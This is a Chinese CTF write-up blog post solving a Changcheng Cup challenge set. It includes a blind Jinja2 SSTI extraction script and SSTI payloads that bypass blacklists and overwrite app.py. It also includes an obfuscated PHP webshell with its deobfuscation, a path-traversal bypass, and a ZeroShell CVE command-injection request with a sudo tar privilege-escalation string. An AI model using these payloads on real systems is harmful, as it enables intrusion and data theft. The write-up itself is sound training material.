<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第二届长城杯/铁三 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第二届国赛webSafe_Proxy源码题目 1from flask import Flask, request, render_template_stringimport socketimport threadingimport htmlapp &#x3D; Flask(__name__)@app.route(&#x27;&#x2F;&#x27;, methods&#x3D;&quot;GET&quot;])def sour">
<meta property="og:type" content="article">
<meta property="og:title" content="第二届长城杯&#x2F;铁三">
<meta property="og:url" content="http://example.com/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%93%81%E4%B8%89/index.html">
<meta property="og:site_name" content="DDL&#39;S BLOG">
<meta property="og:description" content="第二届国赛webSafe_Proxy源码题目 1from flask import Flask, request, render_template_stringimport socketimport threadingimport htmlapp &#x3D; Flask(__name__)@app.route(&#x27;&#x2F;&#x27;, methods&#x3D;&quot;GET&quot;])def sour">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/avatar.png">
<meta property="article:published_time" content="2024-12-17T07:29:12.000Z">
<meta property="article:modified_time" content="2024-12-17T07:30:19.899Z">
<meta property="article:author" content="DDL">
<meta property="article:tag" content="5wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%93%81%E4%B8%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '第二届长城杯/铁三',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">第二届长城杯/铁三</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第二届长城杯/铁三</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-17T07:29:12.000Z" title="Created 2024-12-17 15:29:12">2024-12-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-17T07:30:19.899Z" title="Updated 2024-12-17 15:30:19">2024-12-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>13mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第二届国赛"><a href="#第二届国赛" class="headerlink" title="第二届国赛"></a>第二届国赛</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>源码题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_stringimport socketimport threadingimport htmlapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=&quot;GET&quot;])def source():    with open(__file__, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        return&#x27;&lt;pre&gt;&#x27;+html.escape(f.read())+&#x27;&lt;/pre&gt;&#x27;@app.route(&#x27;/&#x27;, methods=[&quot;POST&quot;])def template():    template_code = request.form.get(&quot;code&quot;)    # 安全过滤    blacklist = [&#x27;__&#x27;, &#x27;import&#x27;, &#x27;os&#x27;, &#x27;sys&#x27;, &#x27;eval&#x27;, &#x27;subprocess&#x27;, &#x27;popen&#x27;, &#x27;system&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;]    for black in blacklist:        if black in template_code:            return&quot;Forbidden content detected!&quot;    result = render_template_string(template_code)    print(result)    return&#x27;ok&#x27;if result is not None else&#x27;error&#x27;class HTTPProxyHandler:    def __init__(self, target_host, target_port):        self.target_host = target_host        self.target_port = target_port    def handle_request(self, client_socket):        try:            request_data = b&quot;&quot;            while True:                chunk = client_socket.recv(4096)                request_data += chunk                if len(chunk) &lt; 4096:                    break            if not request_data:                client_socket.close()                return            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:                proxy_socket.connect((self.target_host, self.target_port))                proxy_socket.sendall(request_data)                response_data = b&quot;&quot;                while True:                    chunk = proxy_socket.recv(4096)                    if not chunk:                        break                    response_data += chunk            header_end = response_data.rfind(b&quot;\r\n\r\n&quot;)            if header_end != -1:                body = response_data[header_end + 4:]            else:                body = response_data            response_body = body            response = b&quot;HTTP/1.1 200 OK\r\n&quot; \            b&quot;Content-Length: &quot; + str(len(response_body)).encode() + b&quot;\r\n&quot; \            b&quot;Content-Type: text/html; charset=utf-8\r\n&quot; \            b&quot;\r\n&quot; + response_body            client_socket.sendall(response)        except Exception as e:            print(f&quot;Proxy Error: &#123;e&#125;&quot;)        finally:            client_socket.close()def start_proxy_server(host, port, target_host, target_port):    proxy_handler = HTTPProxyHandler(target_host, target_port)    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    server_socket.bind((host, port))    server_socket.listen(100)    print(f&quot;Proxy server is running on &#123;host&#125;:&#123;port&#125; and forwarding to &#123;target_host&#125;:&#123;target_port&#125;...&quot;)    try:        while True:            client_socket, addr = server_socket.accept()            print(f&quot;Connection from &#123;addr&#125;&quot;)            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))            thread.daemon = True            thread.start()    except KeyboardInterrupt:        print(&quot;Shutting down proxy server...&quot;)    finally:        server_socket.close()def run_flask_app():    app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)if __name__ == &quot;__main__&quot;:    proxy_host = &quot;0.0.0.0&quot;    proxy_port = 5001    target_host = &quot;127.0.0.1&quot;    target_port = 5000    # 安全反代，防止针对响应头的攻击    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))    proxy_thread.daemon = True    proxy_thread.start()    print(&quot;Starting Flask app...&quot;)    run_flask_app()</span><br></pre></td></tr></table></figure>

<p>ssti没回应，</p>
<h4 id="法一盲注"><a href="#法一盲注" class="headerlink" title="法一盲注"></a>法一盲注</h4><p>附上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">from urllib.parse import urlencode</span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">part1=&quot;&#123;&#123;()|attr(&#x27;_&#x27;&#x27;_class_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_mro_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(1)|attr(&#x27;_&#x27;&#x27;_subclasses_&#x27;&#x27;_&#x27;)()|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(133)|attr(&#x27;_&#x27;&#x27;_init_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_globals_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;&quot;</span><br><span class="line">part3=&quot;&#x27;)|attr(&#x27;re&#x27;&#x27;ad&#x27;)()&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">url=&quot;http://8.147.128.179:22740&quot;</span><br><span class="line">for i in range(1,50):    #[&quot;(head -c n /flag | tail -c 1)&quot;  = &quot;j&quot; ] &amp;&amp; sleep 2</span><br><span class="line">    for j in  string.printable:</span><br><span class="line">        print(flag)</span><br><span class="line">        part2 = &quot;[ \&quot;$(head -c &quot; + str(i) + &quot; /flag | tail -c 1)\&quot; = \&quot;&quot; + j + &quot;\&quot; ] &amp;&amp; sleep 2&quot;</span><br><span class="line">        coco=part1 + part2 + part3</span><br><span class="line">        payload=urlencode(coco)</span><br><span class="line">        print(payload)</span><br><span class="line">        time1=time.time()</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;code&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        time2=time.time()</span><br><span class="line">        if(time2-time1&gt;1.5):</span><br><span class="line">            flag+=j</span><br><span class="line">            break</span><br><span class="line">&quot;&quot;&quot;&quot;</span><br><span class="line">&#123;&#123;()|attr(&#x27;_&#x27;&#x27;_class_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_mro_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(1)|attr(&#x27;_&#x27;&#x27;_subclasses</span><br><span class="line">_&#x27;&#x27;_&#x27;)()|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(133)|attr(&#x27;_&#x27;&#x27;_init_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_globals_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;sleep 10&#x27;)|attr(&#x27;re&#x27;&#x27;ad&#x27;)()&#125;&#125;&quot;&quot;&quot;</span><br><span class="line">#if head -c /flag )</span><br></pre></td></tr></table></figure>

<h4 id="法二覆盖"><a href="#法二覆盖" class="headerlink" title="法二覆盖"></a>法二覆盖</h4><p>本地调试源码（return’ok’if result is not None else’error’改成return’ok’+result if result is not None else’error’）然后用焚情打本地</p>
<p>覆盖app.py路由</p>
<p>ls &#x2F; &gt;app.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set gl=&#x27;_&#x27;2+&#x27;globals&#x27;+&#x27;_&#x27;2%&#125;&#123;%set bu=&#x27;_&#x27;2+&#x27;builtins&#x27;+&#x27;_&#x27;2%&#125;&#123;%set im=&#x27;_&#x27;2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;2%&#125;&#123;%set hz=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][im](hz)[&#x27;p&#x27;&#x27;open&#x27;](&#x27;ls+/&gt;app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>cat &#x2F;flag &gt;app.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set gl=&#x27;_&#x27;2+&#x27;globals&#x27;+&#x27;_&#x27;2%&#125;&#123;%set bu=&#x27;_&#x27;2+&#x27;builtins&#x27;+&#x27;_&#x27;2%&#125;&#123;%set im=&#x27;_&#x27;2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;2%&#125;&#123;%set hz=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][im](hz)[&#x27;p&#x27;&#x27;open&#x27;](&#x27;cat+/flag&gt;app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h3><p>这个当初没做出来，是将..&#x2F;替换成了空，然后…&#x2F;.&#x2F;用来目录穿越就可以了，</p>
<p>tips文件是一个phpinfo</p>
<p>hackme.php里面是一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__);$lJbGIY=&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;;$OlWYMv=&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;;$lapUCm=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$YwzIst=$lapUCm&#123;3&#125;.$lapUCm&#123;6&#125;.$lapUCm&#123;33&#125;.$lapUCm&#123;30&#125;;$OxirhK=$lapUCm&#123;33&#125;.$lapUCm&#123;10&#125;.$lapUCm&#123;24&#125;.$lapUCm&#123;10&#125;.$lapUCm&#123;24&#125;;$YpAUWC=$OxirhK&#123;0&#125;.$lapUCm&#123;18&#125;.$lapUCm&#123;3&#125;.$OxirhK&#123;0&#125;.$OxirhK&#123;1&#125;.$lapUCm&#123;24&#125;;$rVkKjU=$lapUCm&#123;7&#125;.$lapUCm&#123;13&#125;;$YwzIst.=$lapUCm&#123;22&#125;.$lapUCm&#123;36&#125;.$lapUCm&#123;29&#125;.$lapUCm&#123;26&#125;.$lapUCm&#123;30&#125;.$lapUCm&#123;32&#125;.$lapUCm&#123;35&#125;.$lapUCm&#123;26&#125;.$lapUCm&#123;30&#125;;eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));?&gt;</span><br></pre></td></tr></table></figure>

<p>eval换成echo输出出来看看</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217120401939.png?raw=true" alt="image-20241217120401939"></p>
<p>然后再修改一下让他输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__);</span><br><span class="line">$lJbGIY=&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;;</span><br><span class="line">$OlWYMv=&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;;</span><br><span class="line">$lapUCm=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);</span><br><span class="line">$YwzIst=$lapUCm&#123;3&#125;.$lapUCm&#123;6&#125;.$lapUCm&#123;33&#125;.$lapUCm&#123;30&#125;;$OxirhK=$lapUCm&#123;33&#125;.$lapUCm&#123;10&#125;.$lapUCm&#123;24&#125;.$lapUCm&#123;10&#125;.$lapUCm&#123;24&#125;;</span><br><span class="line">$YpAUWC=$OxirhK&#123;0&#125;.$lapUCm&#123;18&#125;.$lapUCm&#123;3&#125;.$OxirhK&#123;0&#125;.$OxirhK&#123;1&#125;.$lapUCm&#123;24&#125;;</span><br><span class="line">$rVkKjU=$lapUCm&#123;7&#125;.$lapUCm&#123;13&#125;;$YwzIst.=$lapUCm&#123;22&#125;.$lapUCm&#123;36&#125;.$lapUCm&#123;29&#125;.$lapUCm&#123;26&#125;.$lapUCm&#123;30&#125;.$lapUCm&#123;32&#125;.$lapUCm&#123;35&#125;.$lapUCm&#123;26&#125;.$lapUCm&#123;30&#125;;</span><br><span class="line">eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="line">#echo($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$uWcdaA=&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==&quot;;</span><br><span class="line">echo $YwzIst($OxirhK($YpAUWC($uWcdaA,$rVkKjU*2),$YpAUWC($uWcdaA,$rVkKjU,$rVkKjU),$YpAUWC($uWcdaA,0,$rVkKjU)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看不到，看源代码</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217121115421.png?raw=true" alt="image-20241217121115421"></p>
<p>出一句话木马，蚁剑连接走disable_function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zed8l51f9k8f9ptch3w.cloudeci1.ichunqiu.com/index.php?file=..././hackme.php</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="zeroshell"><a href="#zeroshell" class="headerlink" title="zeroshell"></a>zeroshell</h2><p>题目内容：</p>
<p>小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</p>
<p>（本题附件见于提前下载的加密附件2e9c01da1d333cb8840968689ed3bc57.7z，解压密码为11b0526b-9cfb-4ac4-8a75-10ad9097b7ce ）</p>
<p>搜base64的flag出包，然后解码referer</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241216211305334.png?raw=true" alt="image-20241216211305334"></p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}</p>
<p>这个是cve，第一种方法是在网上找，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://developer.aliyun.com/article/1334090</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217122458442.png?raw=true" alt="image-20241217122458442"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241215141636810.png?raw=true" alt="image-20241215141636810"></p>
<p>第二种是看流量包，用流量包里面的（就是上边第一问的这个）</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241216211604085.png?raw=true" alt="image-20241216211604085"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;ps%20-ef&#x27;%0A&#x27; HTTP/1.1\r\n</span><br></pre></td></tr></table></figure>

<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>flag{202.115.89.103}</p>
<p>找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{<a target="_blank" rel="noopener" href="http://www.abc.com}/">www.abc.com}</a> 或 flag{16.122.33.44}</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217123236823.png?raw=true" alt="image-20241217123236823"></p>
<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>flag为.nginx</p>
<p>请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217133308470.png?raw=true" alt="image-20241217133308470"></p>
